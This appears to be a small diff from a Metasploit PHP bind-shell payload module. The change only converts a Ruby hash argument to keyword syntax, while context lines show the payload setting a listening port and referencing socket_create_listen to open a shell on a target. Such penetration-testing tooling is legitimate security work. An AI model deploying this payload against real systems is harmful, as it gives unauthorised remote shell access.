@@ -43,7 +43,7 @@ module MetasploitModule
 
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4);
     shell = <<-END_OF_PHP_CODE
-    #{php_preamble({:disabled_varname => dis})}
+    #{php_preamble(disabled_varname: dis)}
     $port=#{datastore['LPORT']};
 
     $scl='socket_create_listen';
